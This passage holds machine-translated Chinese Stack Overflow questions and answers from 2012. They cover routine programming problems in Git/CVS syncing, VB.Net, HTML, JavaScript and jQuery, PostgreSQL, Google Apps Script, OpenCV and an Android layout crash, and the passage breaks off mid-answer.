
* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-02-06T20:10:49.150

创建新线程很慢，但没那么慢。尼克报告约 10 毫秒/线程。很可能它发生在 Visual Studio 调试器下。在 Visual Studio 调试器下，每个新线程我得到约 3.9 毫秒。在没有调试器的情况下，每个新线程我得到约 0.15 毫秒。

[http://dennisgorelik.livejournal.com/125269.html?thread=2238805#t2238805](http://dennisgorelik.livejournal.com/125269.html?thread=2238805#t2238805)

# git - 从 Git 项目中更新 CVS 模块

> ID：13125106
> 
> 赞同：3
> 
> 时间：2012-10-29T15:54:34.763
> 
> 标签：git, cvs

我使用 Git 来管理我的存储库，其中包含来自其他地方的 CVS 模块。我不会对 CVS 存储库进行任何本地更改，我只想定期更新它。目前，我在 Git 的控制下制作 CVS 存储库中的所有内容，之后`cvs update`，我将其提交到 Git 中。

有没有更好（更简单或更清洁）的方法可以让我在轻松更新 CVS 模块的同时跟踪我的 Git 存储库？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-06T20:58:51.717

您可能想要做的是在 git 中创建一个子模块，使用[cvs export](http://ximbiot.com/cvs/manual/cvs-1.11.23/cvs_16.html#SEC142)将 cvs 模块导出到此 git 子模块并将其提交到您的 repo。这样可以使主分支清除任何其他 cvs 文件。

完成后，您可以使用 cvs on commit 脚本在有提交时使子模块保持最新 - 这将是我的首选选项。在**伪代码**中它可能看起来像这样：

```
#!/bin/sh

mv -R <submodule>/.git /tmp/
rm -rf <submodule>/*
mv -R  /tmp/.git <submodule>/
cd <submodule>

cvs -d<path> export <module>

find . | xargs git add

git commit -a -m "CVS Updates for `date`" 
```

## 将脚本添加到 CVS：

*   您首先签出 CVSROOT 并将脚本复制到那里，不要忘记使脚本可执行。`cvs -d<path> co CVSROOT`
*   将脚本复制到目录中
*   添加脚本`cvs add`
*   将脚本的文件名添加到`checkoutlist`
*   添加一个条目，`loginfo`该条目将运行脚本。
*   犯罪

# vb.net - VB.Net - 为多维数组的 1 行赋值

> ID：13125108
> 
> 赞同：3
> 
> 时间：2012-10-29T15:54:40.367
> 
> 标签：vb.net

我找不到将值分配给多维数组的简单方法。它是这样工作的：

```
Dim tTableArray(2, 14) As String
tTableArray(0, 0) = "John"
tTableArray(1, 0) = "Doe" 
```

但似乎我应该能够做这样的事情：

```
Dim tTableArray(2, 14) As String
tTableArray({0, 1}, 0) = {"John", "Doe"} 
```

似乎有办法做到这一点，因为当你定义数组时，你可以，例如：

```
Dim values(,) As String = New String(,) {{"John", "Doe"}, {"Jane", "Doe"}, {"Spot", "the Dog"}} 
```

有任何想法吗？抱歉，第一个问题 - 仍然需要弄清楚如何使代码块看起来像代码。

谢谢，克里斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:26:02.093

我不知道分配它的内置方法，但是自制的潜艇可能同样好。扩展建议：

```
Imports System.Runtime.CompilerServices  
Module Module1

    <Extension()>
    Public Sub setRow(p(,) As Object, pRow As Integer, pValues As Object())
        If p.GetLength(1) >= pValues.Length Then
            For i As Integer = 0 To pValues.Length - 1
                p(pRow, i) = pValues(i)
            Next
        End If
    End Sub

End Module 
```

用法：

```
 Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Dim x(,) As String
        ReDim x(2, 4)

        x.setRow(0, {"Mr.", "", "John", "Doe", "-"})
        x.setRow(1, {"Ms.", "Dr.", "Sue", "Smith", "-"})
        ' ... 
```

# java - Struts 有条件地从一个动作重定向到另一个动作

> ID：13125111
> 
> 赞同：1
> 
> 时间：2012-10-29T15:54:53.887
> 
> 标签：java, struts

我知道在 struts 中可以从一个动作转发到另一个动作，如此处[所示，](https://stackoverflow.com/questions/4956603/action-redirect-in-struts-xml) 但是有没有一种方法可以检查我的一个动作，看看是否存在某个链接，如果它不重定向到另一个动作，简单的例子会有所帮助。谢谢

# html - 将 display:block 用于其中的一个元素?

> ID：13125115
> 
> 赞同：0
> 
> 时间：2012-10-29T15:54:59.803
> 
> 标签：html, html-lists

`<a></a>`我可以公平地放入什么样的 HTML 元素？
我喜欢做以下

```
<a href="#" title="Click the icon">
    <div style="display: block; padding: 1em; background-image: url('1_tn.png'); text-indent: -9000;">
        <h3>
            Lorem ipsum
        </h3>
    </div>
</a> 
```

或者

```
<ul>
    <a href="#" title="Click the icon">
        <li style="display: block; padding: 1em; background-image: url('1_tn.png'); text-indent: -9999;">
            <h3>
                Lorem ipsum
            </h3>
        </li>
    </a>
</ul> 
```

，但我认为是不可接受的。w3 验证器也这么说。

也许这可以是一个解决方案：

```
<a href="#" title="Click the icon">
    <span style="display: block; padding: 1em; background-image: url('1_tn.png'); text-indent: -9999;">
        Lorem ipsum
    </span>
</a> 
```

但在这种情况下 - 我认为 - 将`<span>`元素转换为块是无效的，并且可能会导致浏览器的差异。

你有这方面的经验吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T15:59:11.740

4.01 规范基本上说锚元素（或所有内联元素）不能有块级子元素，因此您尝试采用的方法无效。当然你可以这样做（span 方法对于兼容性更好，因为它应该验证）但它不会是语义的，如果这对你很重要。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-29T16:18:44.327

看起来您正在尝试使用图像替换将您的 h3 文本转换为图像链接，对吗？看看[http://jsfiddle.net/QKtWq/2/](http://jsfiddle.net/QKtWq/2/)

HTML：

```
<h3>
  <a href="#" title="Click me!">Lorem ipsum</a>
</h3> 
```

CSS：

```
h3 {
    background: black url('http://jsfiddle.net/img/logo.png') no-repeat;
    text-indent: -9000px;
    height:100px; /* usually set to the height of the image */
}
h3 a {
    display:block;
    height:100%;
} 
```

如果您不希望它为 100%，也可以在 h3 上设置特定宽度。

编辑：从 h3 css 中删除 display:block。标头已经是块元素。

# asp.net-mvc-4 - 如何将 MVC 2.0 项目升级到 MVc 4.0？

> ID：13125120
> 
> 赞同：1
> 
> 时间：2012-10-29T15:55:12.880
> 
> 标签：asp.net-mvc-4

我们正在尝试将 mvc 2.0 应用程序升级到 mvc 4.0。

这是我尝试过的 1>安装了 mvc 4.0 2>将项目更改为目标 .net framework 4.0。

但是，当我检查项目引用时，目标 System.web.mvc 仍然是 2.0.0.0 版本。

我是否要手动删除这些引用并重新添加它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:00:13.210

是的，删除对 System.Web.Mvc 的引用并重新添加它们。这与从 MVC 2 升级到 MVC 3的[发行说明一致，同样的原则也适用于 MVC 4。](http://www.asp.net/whitepapers/mvc3-release-notes#upgrading)

> 在解决方案资源管理器中，删除对 System.Web.Mvc 的引用（它指向版本 2 中的 DLL），然后添加对 System.Web.Mvc (v3.0.0.0) 的引用。

（或在您的情况下为 v4.0.0.0）

# google-apps-script - 如何只删除一些工作表？

> ID：13125123
> 
> 赞同：2
> 
> 时间：2012-10-29T15:55:16.810
> 
> 标签：google-apps-script, google-sheets

这是我正在做的事情（我复制并尝试从旧消息中改编它）：

1）在有许多工作表的电子表格中创建一个工作表并将其重命名为“TOC”

2) 在“TOC”中，在 A1 中添加这个公式： =SheetNames( GoogleClock() )

3) 在 Google Apps 脚本中复制后，运行下面的函数“SheetNames”

```
function SheetNames() { // this will create a list of all the sheets ;)
try {
  var sheets = SpreadsheetApp.getActiveSpreadsheet().getSheets()
  var out = new Array( sheets.length+1 ) ;
  out[0] = [ "Name" , "gid" ];
  for (var i = 1 ; i < sheets.length+1 ; i++ ) out[i] = [sheets[i-1].getName() , sheets[i-1].getSheetId() ];
  return out
}
catch( err ) {
  return "#ERROR!" 
}
} 
```

4) 运行函数“delete_only_some_sheets”

```
function delete_only_some_sheets() {
// CAUTION !! It will delete some sheets ! 
var ss = SpreadsheetApp.getActiveSpreadsheet();
var source = ss.getSheetByName("TOC");
for (var i = 3; i<=5; i++){ // !!! HERE adapt the "5" number to your needs here
var tet = source.getRange(["B"]+[(i)]).getValues();

//ss.setActiveSheet(ss.getSheetId()[tet]); ///ERROR here ! ;(
   ss.deleteActiveSheet();
   //ss.deleteSheetId()[tet]; //possible ??

}
} 
```

我不断收到错误“找不到方法“setActiveSheet（。”）而且我被阻止了。;(

提前谢谢了 ;）

**编辑 ：**

您好，感谢“Srik”，我找到了解决方案！;) 第 1) 到 3) 部分是相同的。第 4 部分）变为：

4) 运行函数“delete_only_some_sheets”

```
function delete_only_some_sheets() {
// CAUTION !! IT will delete some sheets ! 
var ss = SpreadsheetApp.getActiveSpreadsheet();
var source = ss.getSheetByName("TOC");
for (var i = 3; i<=5; i++){ // !!! HERE adapt the "5" number to your needs here
var tet = source.getRange(["A"]+[(i)]).getValues();

ss.setActiveSheet(ss.getSheetByName(tet));
ss.deleteActiveSheet();

} 
```

}

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:09:59.913

首先，没有`getSheetId()`方法。我假设您指的是`getSheets()`此处返回对象数组的方法`Sheet`。

其次，`setActiveSheet()`将`Sheet`对象作为参数。使用`getSheets()`方法，你可以简单地做如下

```
ss.setActiveSheet(ss.getSheets()[i]); 
```

无需阅读 TOC 表、获取 id 等。

# javascript - 对二维 javascript 数组进行排序

> ID：13125124
> 
> 赞同：0
> 
> 时间：2012-10-29T15:55:18.973
> 
> 标签：javascript, jquery, sorting

我有一个包含标签列表和计数的数组。

```
tags_array[0] = tags;
tags_array[1] = tags_count; 
```

我需要根据计数对数组进行排序，以便挑选出前几个标签。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:01:21.683

假设`tags`和`tags_count`是 2 个长度相同的数组，我将首先构建一个适当的对象数组：

```
var array = [];
for (var i=0; i<tags_count.length; i++) {
    array.push({tag:tags[i], count:tags_count[i]});
} 
```

然后按 count 排序：

```
array.sort(function(a, b) {return a.count-b.count}); 
```

如果您需要在那之后取回您的阵列，您可以这样做

```
for (var i=0; i<array.length; i++) {
    tags[i] = array[i].tag;
    tags_count[i] = array[i].count;
} 
```

[示范](http://jsfiddle.net/vt8y6/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:42:39.837

排序一，同时存储排序比较。然后使用这些结果对另一个进行排序：

```
var res = [];
tags_count.sort( function( a, b ){ return res.push( a=a-b ), a; } );
tags.sort( function(){ return res.shift(); } ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:03:23.427

假设 tags 和 tags_count 都是长度相同的数组（问题的那部分不太清楚），以下是解决问题的一种方法。

```
var tags_array = new Array();

for (var i = 0; i < tags.length; i++)
{
    tags_array[i] = {};
    tags_array[i].tagName = tags[i];
    tags_array[i].tagCount = tags_count[i];
}

tags_array.sort(function(a,b){return b.tagCount-a.tagCount}); 
```

应该注意的是，可以从一开始就以这种方式构造数据，而不是像这样重写它，在这种情况下这是更可取的。同样，可以使用更好的结构来保存数据，但这会起作用。

# postgresql - 选择两个 Unix 时间戳之间的日期

> ID：13125141
> 
> 赞同：4
> 
> 时间：2012-10-29T15:56:26.047
> 
> 标签：postgresql, timestamp, unix-timestamp

我有表用户。

列：

*   user_id - 整数
*   user_date - 整数（unix 时间戳）

有些行有 user_date，有些有 NULL。

我需要找到所有 user_id，其中 user_date 包括“2012-10-21”和“2012-10-24”之间的时间段

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T17:53:06.983

```
SELECT *
FROM users
WHERE user_date BETWEEN
  EXTRACT(EPOCH FROM date '2012-10-21') AND
  EXTRACT(EPOCH FROM date '2012-10-24' + interval '1 day'); 
```

如果您不希望包含结束日期，请删除添加一天的位。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T15:59:05.100

```
select *
from users
where 
    timestamp 'epoch' + user_date * interval '1 second' between '2012-10-21' and '2012-10-24' 
    and
    user_date is not null 
```

# jquery - Jquery 脚本未按预期执行

> ID：13125142
> 
> 赞同：0
> 
> 时间：2012-10-29T15:56:28.613
> 
> 标签：jquery

我有一个简单的 jquery ajax 脚本，可以将值发送到 Web 服务进行处理，但由于某种原因，jquery 根本没有运行。

```
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Insert title here</title>
<script type="text/javascript" src="jquery-1.8.2.js"></script>
<script type="text/javascript" src="update-cart.js"></script>
</head>
<body>
<div id='colors'>
<a href="3333">Add Color</a>
</div>
</body>
</html> 
```

这是 jQuery

```
// to use surround anchor tags with div (id=colors). Set color or scheme id as href value. On click the item is posted to the web service.
// To do improve response handling from webservice.

$(document)ready(function(){
    $("#colors a").live("click", function() {
        alert("We get here");
        var item = $(this).attr( 'href' );
        var jqxhr = $.post("webservice.php", { action: "add", color: item }, function() {
            alert("success");
        })
        .error(function() { alert("error"); })
        .complete(function() { alert("complete"); });
    });
}); 
```

这是我正在使用[http://www.2100computerlane.net/workingproject/index.html测试的示例](http://www.2100computerlane.net/workingproject/index.html)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T15:58:10.370

`$(document)ready(function(){`缺少一个点来指示函数调用：

```
$(document).ready(function(){ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T15:59:52.027

当我单击链接时，我收到了 javascript 错误“Uncaught SyntaxError: Unexpected identifier”。

# jquery - 将 css3 转换比例因子分解为可调整大小的 jquery ui

> ID：13125145
> 
> 赞同：0
> 
> 时间：2012-10-29T15:56:31.320
> 
> 标签：jquery, jquery-ui, css, jquery-ui-resizable

我试图在使用 jquery ui resizeable 时考虑缩放元素的影响。

这里有一些关于调整大小/拖动的 css3 转换问题的帖子......我发现没有一个可以提供成功的解决方案。

我暂时搁置轮换问题。只是希望它与规模一起工作。

我设法修改了可拖动的，但在调整大小时遇到​​了问题。例子：

```
HTML

 <div id= 'div1'> 
resize the div and note that the mouse cursor's
distance from the resize handle increases over time
<div>

  CSS
 #div1{
  margin:100px;
 width:100px;
 height:100px;
 border:1px solid black;
 font-size:12pt;
 overflow:hidden;
 -webkit-transform:scale(2);
 }​​

  JS
 $('#div1').resizable(); 
```

[http://jsfiddle.net/asaf/JBE2r/1/](http://jsfiddle.net/asaf/JBE2r/1/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T05:59:44.707

实现此目的的一种方法是将 _mouseDarg 事件中的 dx 和 dy 变量除以变换比例属性。（在我的情况下，x 和 y 变换始终相同）我在 mousestart 事件中设置了“scaleFactor”参数。

```
 _mouseDrag: function(event) {
   console.log(this.size.height);
 var yDiff = event.pageY / this.originalMousePosition.top;
 //console.log(yDiff);

    //Increase performance, avoid regex
    var el = this.helper, o = this.options, props = {},
        self = this, smp = this.originalMousePosition, a = this.axis;

    var dx = (event.pageX-smp.left)||0, dy = (event.pageY-smp.top)||0; 
    var trigger = this._change[a];
    if (!trigger) return false;

    //NOTE adjusting dx, dy below by the transform scale factor:

    dy = dy / self.scaleFactor;
    dx = dx / self.scaleFactor; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T23:43:52.273

我为这个问题写了一个解决方案，并在此处发布了详细信息：

[http://gungfoo.wordpress.com/2013/02/15/jquery-ui-resizabledraggable-with-transform-scale-set/](http://gungfoo.wordpress.com/2013/02/15/jquery-ui-resizabledraggable-with-transform-scale-set/)

jquery-ui的源码不用改。您所需要的只是一个可调整大小元素事件的回调，该`resize`元素会根据 CodeToads 答案中的比例因子进行调整。

```
function resizeFix(event, ui) {
    var changeWidth = ui.size.width - ui.originalSize.width; // find change in width
    var newWidth = ui.originalSize.width + changeWidth / zoomScale; // adjust new width by our zoomScale

    var changeHeight = ui.size.height - ui.originalSize.height; // find change in height
    var newHeight = ui.originalSize.height + changeHeight / zoomScale; // adjust new height by our zoomScale

    ui.size.width = newWidth;
    ui.size.height = newHeight;
}

$(this).resizable({
    minWidth: -(contentElem.width()) * 10,  // these need to be large and negative
    minHeight: -(contentElem.height()) * 10, // so we can shrink our resizable while scaled
    resize: resizeFix
}); 
```

# performance - Ember.JS：观察@each，但只是迭代新/更改的项目

> ID：13125146
> 
> 赞同：6
> 
> 时间：2012-10-29T15:56:33.050
> 
> 标签：performance, ember.js

我目前正在观察一些 Ember 数组，如下所示：

```
 observe_array: function() {
     this.get("my_array").forEach(function(e,i) {
         // do something
     });
 }.observes("my_array.@each"); 
```

大多数情况下，如果 my_array 被更新，多个元素会同时添加。但是，观察者会在添加每个元素时一个接一个地触发，这变得非常低效。反正有没有更有效地做到这一点？本质上，我需要能够拥有一个基于“my_array”的变异数组

作为参考，my_array 的实际大小将在 600-1200 个元素之间。“做某事”块涉及一些需要更多时间的操作 - 从字符串创建 Date 对象并将每个元素转换为 json 表示。

我没有做一个观察者，我还尝试了一个带有 cacheable() 方法/标志的属性，但这并没有很好地加快速度......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T10:01:43.273

假设（通过注释）您的数组是一个填充了 ember 数据的数组，您应该尝试观察`array.isUpdating`属性。我用这个成功了。

*唯一的缺点是它只在使用时设置`.findAll()`！（所以`Model.find()`）*

# json - 使用 json 服务上传 Extjs 文件？

> ID：13125148
> 
> 赞同：1
> 
> 时间：2012-10-29T15:56:39.613
> 
> 标签：json, file-upload, extjs, ria, extjs4.1

我正在使用 json 服务（.net RIA 服务）将数据从 Extjs 推送到服务器。目前我需要将文档上传到服务器。我看到了一些使用表单提交到 php 文件的示例。

这可以通过json服务实现吗？或者是否有必要创建一些我可以接受表单提交的服务器逻辑？

是否可以从客户端读取一些二进制数据并将其作为 json 数据推送到服务器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T23:16:33.153

是的，这是可能的。您应该使用`FileReader`获取二进制 base64 编码内容 ( `FileReader.readAsDataURL(Blob|File)`)，您可以使用 JSON 传输这些内容。

更多见解：http: [//www.html5rocks.com/en/tutorials/file/dndfiles/](http://www.html5rocks.com/en/tutorials/file/dndfiles/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T07:11:59.990

在 Extjs 中，文件上传不是使用普通的“Ajax”技术执行的，也就是说它们不是使用 XMLHttpRequests 执行的。相反，一个包含所有字段的隐藏元素被临时创建并提交，其目标集是指一个动态生成的隐藏元素，该元素被插入到文档中，但在收集返回数据后被删除。

请注意，文件上传数据包是使用内容类型 multipart/form 和一些服务器技术发送的

检查：[http ://docs.sencha.com/ext-js/4-1/#!/api/Ext.form.Basic-method-hasUpload](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.form.Basic-method-hasUpload)

# unixodbc - eclipse odbc 在索引中找不到符号

> ID：13125154
> 
> 赞同：0
> 
> 时间：2012-10-29T15:57:01.770
> 
> 标签：unixodbc

当我尝试单击 ODBC 函数（如 SQLExecDirectW、SQLBindCol 等）时，我收到以下消息。我目前在 Ubuntu 上使用 Eclipse。

例子：

在索引中找不到符号“SQLExecDirectW”。

您能否让我知道如何配置 eclipse 以确保知道有关该功能的详细信息。

感谢 lor 的回复。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T15:35:48.480

想出了解决办法。尽管我在 eclipse 项目中包含了该库，但它没有被正确引用。

# jquery - 根据 div 是否具有某个类，动画到某个高度

> ID：13125159
> 
> 赞同：0
> 
> 时间：2012-10-29T15:57:11.023
> 
> 标签：jquery, if-statement

我有一个 div，我想根据 click 元素将动画设置为 3 个不同的高度。我本来想用类来做，所以如果点击了一个名为 d_foxboro 的 div 并且它有一个 height_one 类，则 location_slider 动画到第一个高度，如果点击另一个 div，d_main 并且它有一个height_two 的类，然后 location_slider 动画到第二个高度，依此类推。

```
$( "#d_Foxboro" ).click(function(){
$( "#location_slider" ).animate({
"height": 500
}, 450 );
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:02:48.157

```
$( "#d_Foxboro" ).click(function(){
    var height = 0;
    if($(this).hasClass('class1')){ 
       height = 400; 
   } else if($(this).hasClass('class2')){ 
       height = 500; 
   } else if($(this).hasClass('class3')){ 
       height = 600; 
   }

   $( "#location_slider" ).animate({
       "height": height
   }, 450 );

}); 
```

基本上，使用 hasClass 查看您的元素具有哪个类，然后根据类设置包含您的高度的变量

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:02:46.147

我个人喜欢使用`.on()`绑定事件的方法，因为如果元素被动态添加到 DOM，它允许我轻松更改它。

```
$( "#d_Foxboro" ).on("click", function(){
    var height = 0;
    if ($(this).hasClass() == "someClass"){
        height = 100;
    }
    else
    {
        height = 200;           
     }
    $( "#location_slider" ).animate({
         "height": height
       }, 450 );
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:04:28.793

单击时检查类，然后根据该类设置一个高度变量

```
$( "#d_Foxboro" ).click(function(){
  // Default height
  var h = 0; // Set to a default number
  // Class of clicked item
  var h_class = $(this).attr('class');

  // Check class and set height based of which class
  if(h_class == "something") {
    h = 500;
  } else if(h_class == "something else") {
    h = 400
  }

  $( "#location_slider" ).animate({
    "height": h
  }, 450 );

}); 
```

# opencv - 分配像素值的安全方法

> ID：13125162
> 
> 赞同：0
> 
> 时间：2012-10-29T15:57:26.787
> 
> 标签：opencv

任何人都知道如何以安全快速的方式分配像素值？目前我用这个，

```
dataTemp[y*stepTemp + x] = 255*constant_value*pow(dataTemp[y*stepTemp + x]/255.0, 1.25); 
```

可能会丢失数据（从 double 转换为 uchar），恐怕这些值会变为 255。我使用的是 C（IplImage）。请帮我解决一下这个。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:00:06.380

如果你有很多像素要转换（看起来像伽马校正），自然的优化是从计算一个查找表（256 个 uchars 的数组）开始，然后对每个像素使用它。

# android - 不幸的是，应用程序已停止 AVD

> ID：13125167
> 
> 赞同：1
> 
> 时间：2012-10-29T15:57:51.437
> 
> 标签：android, logcat, avd

因此，我正在创建一个显示 googlemap 的简单应用程序。我没有项目错误，但不幸的是“应用程序”已停止错误。

这是我的日志猫

```
10-29 13:10:00.916: D/AndroidRuntime(458): Shutting down VM
10-29 13:10:00.916: W/dalvikvm(458): threadid=1: thread exiting with uncaught exception (group=0x409961f8)
10-29 13:10:00.936: E/AndroidRuntime(458): FATAL EXCEPTION: main
10-29 13:10:00.936: E/AndroidRuntime(458): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.bossapps.campusmapped/com.bossapps.campusmapped.MainActivity}: android.view.InflateException: Binary XML file line #1: Error inflating class android.widget.RelativeLayout
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1955)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1980)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.ActivityThread.access$600(ActivityThread.java:122)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1146)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.os.Handler.dispatchMessage(Handler.java:99)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.os.Looper.loop(Looper.java:137)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.ActivityThread.main(ActivityThread.java:4340)
10-29 13:10:00.936: E/AndroidRuntime(458):  at java.lang.reflect.Method.invokeNative(Native Method)
10-29 13:10:00.936: E/AndroidRuntime(458):  at java.lang.reflect.Method.invoke(Method.java:511)
10-29 13:10:00.936: E/AndroidRuntime(458):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
10-29 13:10:00.936: E/AndroidRuntime(458):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
10-29 13:10:00.936: E/AndroidRuntime(458):  at dalvik.system.NativeStart.main(Native Method)
10-29 13:10:00.936: E/AndroidRuntime(458): Caused by: android.view.InflateException: Binary XML file line #1: Error inflating class android.widget.RelativeLayout
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.LayoutInflater.createView(LayoutInflater.java:606)
10-29 13:10:00.936: E/AndroidRuntime(458):  at com.android.internal.policy.impl.PhoneLayoutInflater.onCreateView(PhoneLayoutInflater.java:56)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.LayoutInflater.onCreateView(LayoutInflater.java:653)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:678)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.LayoutInflater.inflate(LayoutInflater.java:466)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.LayoutInflater.inflate(LayoutInflater.java:396)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.LayoutInflater.inflate(LayoutInflater.java:352)
10-29 13:10:00.936: E/AndroidRuntime(458):  at com.android.internal.policy.impl.PhoneWindow.setContentView(PhoneWindow.java:251)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.Activity.setContentView(Activity.java:1835)
10-29 13:10:00.936: E/AndroidRuntime(458):  at com.bossapps.campusmapped.MainActivity.onCreate(MainActivity.java:12)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.Activity.performCreate(Activity.java:4465)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1919)
10-29 13:10:00.936: E/AndroidRuntime(458):  ... 11 more
10-29 13:10:00.936: E/AndroidRuntime(458): Caused by: java.lang.reflect.InvocationTargetException
10-29 13:10:00.936: E/AndroidRuntime(458):  at java.lang.reflect.Constructor.constructNative(Native Method)
10-29 13:10:00.936: E/AndroidRuntime(458):  at java.lang.reflect.Constructor.newInstance(Constructor.java:417)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.LayoutInflater.createView(LayoutInflater.java:586)
10-29 13:10:00.936: E/AndroidRuntime(458):  ... 23 more
10-29 13:10:00.936: E/AndroidRuntime(458): Caused by: android.content.res.Resources$NotFoundException: Resource is not a Drawable (color or path): TypedValue{t=0x1/d=0x7f050000 a=-1 r=0x7f050000}
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.content.res.Resources.loadDrawable(Resources.java:1899)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.content.res.TypedArray.getDrawable(TypedArray.java:601)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.View.<init>(View.java:2780)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.View.<init>(View.java:2717)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.view.ViewGroup.<init>(ViewGroup.java:379)
10-29 13:10:00.936: E/AndroidRuntime(458):  at android.widget.RelativeLayout.<init>(RelativeLayout.java:174)
10-29 13:10:00.936: E/AndroidRuntime(458):  ... 26 more 
```

有人有想法么？

编辑：请记住，我只添加了一些虚拟按钮来测试它基本上是一个全新的应用程序。除了按钮之外，我创建的唯一东西是保存按钮上显示的字符串的字符串变量，除此之外它是一个全新的应用程序。

这是我的 MainActivity.java

```
package com.bossapps.campusmapped;

import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
} 
```

在 API 版本 16 AVD 上运行

XML 活动主文件

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@style/AppTheme" >

    <TextView
        android:id="@+id/textView2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentTop="true"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="14dp"
        android:text="@string/Welcome"
        tools:context=".MainActivity" />

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@+id/textView2"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="30dp"
        android:text="@string/View_Mode"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <RadioButton
        android:id="@+id/radioButton1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_below="@+id/textView1"
        android:layout_marginLeft="34dp"
        android:layout_marginTop="23dp"
        android:text="@string/Regular" />

    <RadioButton
        android:id="@+id/radioButton2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignLeft="@+id/radioButton1"
        android:layout_below="@+id/radioButton1"
        android:text="@string/Augmented " />

    <Button
        android:id="@+id/button1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@+id/radioButton2"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="33dp"
        android:text="@string/Go" />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:43:44.683

你检查过你有一个`Apptheme`in`@style/Apptheme`吗？因为它是解析器找不到的唯一资源（即：）`not a drawable (color or path)`：

```
10-29 13:10:00.936: E/AndroidRuntime(458): Caused by: 
  android.content.res.Resources$NotFoundException: Resource is not a Drawable 
  (color or path): TypedValue{t=0x1/d=0x7f050000 a=-1 r=0x7f050000} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:02:02.533

从您的跟踪中猜测，您的 xml 布局有问题.... android.view.InflateException: Binary XML file line #1: Error inflating class android.widget.RelativeLayout。

你能发帖吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:08:12.550

```
 10-29 13:10:00.936: E/AndroidRuntime(458): Caused by: android.view.InflateException:     Binary XML file line #1: Error inflating class android.widget.RelativeLayout

